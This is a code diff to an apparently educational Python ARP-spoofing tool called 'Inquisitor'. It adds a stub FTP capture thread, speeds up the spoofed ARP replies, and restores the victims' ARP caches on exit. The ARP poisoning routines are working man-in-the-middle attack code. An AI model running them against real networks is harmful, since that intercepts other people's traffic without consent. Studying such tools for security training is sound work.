@@ -35,10 +35,21 @@ class Inquisitor:
     def threading(self):
         thread_request = threading.Thread(target=self.arp_listener, daemon=True, name="ARP Listener")
         thread_reply = threading.Thread(target=self.arp_replier, daemon=True, name="ARP Replier")
+        thread_capture = threading.Thread(target=self.ftp_listener, daemon=True, name="FTP Listener")
+        
         thread_request.start()
         thread_reply.start()
+        thread_capture.start()
 
     #! MAN IN THE MIDDLE
+
+    def ftp_listener(self):
+        while not self.source.poisoned or not self.target.poisoned:
+            threading_end_event.wait(5)
+        log_warning("Starting FTP capture...")
+        while not threading_end_event.is_set():
+            threading_end_event.wait(0.5)
+        pass
 
     def arp_listener(self):
         count = 0
@@ -64,7 +75,7 @@ class Inquisitor:
                     break
                   
         except KeyboardInterrupt:
-            log_info("Listening for ARP requests stopped by user.")
+            log_warning("Listening for ARP requests stopped by user.")
         except pcapy.PcapError as e:
             log_error(f"Pcapy error during capture: {e}")
             log_error("Make sure to run the script with root privileges (sudo).")
@@ -83,11 +94,15 @@ class Inquisitor:
                     switch = True
             if self.source.poisoned:
                 send_arp_reply(self.interface, self.attacker.mac_address, self.target.ip_address, self.source.mac_address, self.source.ip_address)
-                pass
             if self.target.poisoned:
                 send_arp_reply(self.interface, self.attacker.mac_address, self.source.ip_address, self.target.mac_address, self.target.ip_address)
-                pass
-            threading_end_event.wait(5)
+            threading_end_event.wait(1)
+        if self.source.poisoned:
+            send_arp_reply(self.interface, self.target.mac_address, self.target.ip_address, self.source.mac_address, self.source.ip_address)
+            log_success("Restored source ARP cache.")
+        if self.target.poisoned:
+            send_arp_reply(self.interface, self.source.mac_address, self.source.ip_address, self.target.mac_address, self.target.ip_address)
+            log_success("Restored target ARP cache.")
 
 
 
